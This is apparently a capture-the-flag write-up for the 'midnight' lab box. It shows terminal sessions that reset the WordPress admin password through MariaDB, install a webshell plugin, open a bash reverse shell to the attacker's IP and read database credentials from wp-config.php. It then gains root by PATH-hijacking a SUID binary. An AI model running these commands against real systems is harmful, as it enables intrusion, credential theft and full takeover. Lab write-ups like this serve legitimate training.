@@ -1,0 +1,258 @@
+
+
+
+we are supposed to bruteforce this login. but i kept getting blocked every time I attempted.
+Even with -t on hydra
+
+┌──(root㉿kali)-[/home/kali]
+└─# mysql --skip-ssl-verify-server-cert -h 192.168.195.88 -u root -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 14
+Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Support MariaDB developers by giving a star at https://github.com/MariaDB/server
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| wordpress_db       |
++--------------------+
+
+
+MariaDB [wordpress_db]> select * from wp_users
+    -> ;
++----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
+|  1 | admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
++----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
+1 row in set (0.030 sec)
+
+MariaDB [wordpress_db]> 
+MariaDB [wordpress_db]> update wp_users
+    -> SET user_pass = MD5('yadayada')
+    -> where user_login = 'admin';
+Query OK, 1 row affected (0.031 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+MariaDB [wordpress_db]> 
+
+
+now that we are logged in. Nothing was allowing edits, and the plugin header had to be spoofed in order to install.
+
+# create a working dir and the plugin file with a valid WP header
+Plugin Name: PrettyShell
+Description: Simple webshell plugin (lab use only).
+Version: 1.0
+Author: S1ren (I wish)
+
+there is now a shell on practically any page of the site now.
+
+bash -c "bash -i >& /dev/tcp/192.168.45.210/4444 0>&1"
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444         
+listening on [any] 4444 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.195.88] 36898
+bash: cannot set terminal process group (630): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@midnight:/var/www/html/wordpress$ 
+
+
+www-data@midnight:/var/www/html/wordpress$ ls -lsa
+total 220
+ 4 drwxr-x---  5 www-data www-data  4096 Jul 18  2020 .
+ 4 drwxr-xr-x  3 root     root      4096 Jul 16  2020 ..
+ 4 -rw-r--r--  1 www-data www-data   461 Jul 16  2020 .htaccess
+ 4 -rw-r-----  1 www-data www-data   499 Jul 18  2020 index.php
+20 -rw-r-----  1 www-data www-data 19915 Feb 12  2020 license.txt
+ 8 -rw-r-----  1 www-data www-data  7278 Jan 10  2020 readme.html
+ 8 -rw-r-----  1 www-data www-data  6912 Feb  6  2020 wp-activate.php
+ 4 drwxr-x---  9 www-data www-data  4096 Jun 10  2020 wp-admin
+ 4 -rw-r-----  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
+ 4 -rw-r-----  1 www-data www-data  2332 Jun  2  2020 wp-comments-post.php
+ 4 -rw-r-----  1 www-data www-data  3197 Jul 18  2020 wp-config.php
+ 4 drwxr-x---  6 www-data www-data  4096 Oct 11 10:22 wp-content
+ 4 -rw-r-----  1 www-data www-data  3940 Feb  6  2020 wp-cron.php
+12 drwxr-x--- 21 www-data www-data 12288 Jun 10  2020 wp-includes
+ 4 -rw-r-----  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php
+ 4 -rw-r-----  1 www-data www-data  3300 Feb  6  2020 wp-load.php
+48 -rw-r-----  1 www-data www-data 47874 Feb  9  2020 wp-login.php
+12 -rw-r-----  1 www-data www-data  8509 Apr 14  2020 wp-mail.php
+20 -rw-r-----  1 www-data www-data 19396 Apr  9  2020 wp-settings.php
+32 -rw-r-----  1 www-data www-data 31111 Feb  6  2020 wp-signup.php
+ 8 -rw-r-----  1 www-data www-data  4755 Feb  6  2020 wp-trackback.php
+ 4 -rw-r-----  1 www-data www-data  3133 Feb  6  2020 xmlrpc.php
+www-data@midnight:/var/www/html/wordpress$ cat wp-config.php
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress_db' );
+
+/** MySQL database username */
+define( 'DB_USER', 'jose' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+
+
+www-data@midnight:/var/www/html/wordpress$ cd /home
+www-data@midnight:/home$ ls -lsa
+total 12
+4 drwxr-xr-x  3 root root 4096 Jul 16  2020 .
+4 drwxr-xr-x 18 root root 4096 Aug 14  2020 ..
+4 drwxr-xr-x  3 jose jose 4096 Aug 27  2020 jose
+www-data@midnight:/home$ su jose
+Password: 
+jose@midnight:/home$ cd jose
+jose@midnight:~$ ls -lsa
+total 32
+4 drwxr-xr-x 3 jose jose 4096 Aug 27  2020 .
+4 drwxr-xr-x 3 root root 4096 Jul 16  2020 ..
+0 lrwxrwxrwx 1 root root    9 Jul 16  2020 .bash_history -> /dev/null
+4 -rw-r--r-- 1 jose jose  220 Jul 16  2020 .bash_logout
+4 -rw-r--r-- 1 jose jose 3526 Jul 16  2020 .bashrc
+4 drwxr-xr-x 3 jose jose 4096 Jul 16  2020 .local
+4 -rw-r--r-- 1 jose jose   33 Oct 11 09:45 local.txt
+0 lrwxrwxrwx 1 root root    9 Jul 16  2020 .mysql_history -> /dev/null
+4 -rw-r--r-- 1 jose jose  807 Jul 16  2020 .profile
+4 -rw------- 1 jose jose   41 Aug 27  2020 user.txt
+jose@midnight:~$ 
+
+
+jose@midnight:~$ find / -perm -u=s 2>/dev/null
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/fusermount
+/usr/bin/status
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+jose@midnight:~$ 
+
+jose@midnight:~$ /usr/bin/status --help
+● ssh.service - OpenBSD Secure Shell server
+   Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
+   Active: active (running) since Fri 2025-02-28 03:42:45 EST; 7 months 12 days ago
+     Docs: man:sshd(8)
+           man:sshd_config(5)
+  Process: 467 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
+ Main PID: 511 (sshd)
+    Tasks: 1 (limit: 1148)
+   Memory: 3.4M
+   CGroup: /system.slice/ssh.service
+           └─511 /usr/sbin/sshd -D
+
+Feb 28 03:42:45 midnight systemd[1]: Starting OpenBSD Secure Shell server...
+Feb 28 03:42:45 midnight sshd[511]: Server listening on 0.0.0.0 port 22.
+Feb 28 03:42:45 midnight systemd[1]: Started OpenBSD Secure Shell server.
+Status of the SSH server:jose@midnight:~$ 
+
+
+jose@midnight:~$ strings /usr/bin/status | sed -n '1,200p'
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+printf
+system
+__cxa_finalize
+setgid
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u/UH
+[]A\A]A^A_
+Status of the SSH server:
+service ssh status
+;*3$"
+GCC: (Debian 8.3.0-6) 8.3.0
+
+
+
+
+jose@midnight:~$ cat > /tmp/service <<'SH'
+> #!/bin/sh
+> # Create a suid-root shell
+> cp /bin/sh /tmp/rootsh
+> chmod 4755 /tmp/rootsh
+> exit 0
+> SH
+jose@midnight:~$ chmod +x /tmp/service
+jose@midnight:~$ PATH=/tmp:$PATH /usr/bin/status ssh.service
+Status of the SSH server:jose@midnight:~$ 
+jose@midnight:~$ ls -l /tmp/
+total 124
+-rwsr-xr-x 1 root root 121464 Oct 11 10:42 rootsh
+-rwxr-xr-x 1 jose jose     90 Oct 11 10:42 service
+jose@midnight:~$ /tmp/rootsh -p
+# id
+uid=1000(jose) gid=1000(jose) euid=0(root) groups=1000(jose),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+# 
+
+# cat root.txt
+          ___   ____
+        /' --;^/ ,-_\     \ | /
+       / / --o\ o-\ \\   --(_)--
+      /-/-/|o|-|\-\\|\\   / | \
+       '`  ` |-|   `` '
+             |-|
+             |-|O
+             |-(\,__
+          ...|-|\--,\_....
+      ,;;;;;;;;;;;;;;;;;;;;;;;;,.
+~,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,  ______   ---------   _____     ------
+
+Thanks for playing! - Felipe Winsnes (@whitecr0wz)
+
+Your flag is in another file...
+# 
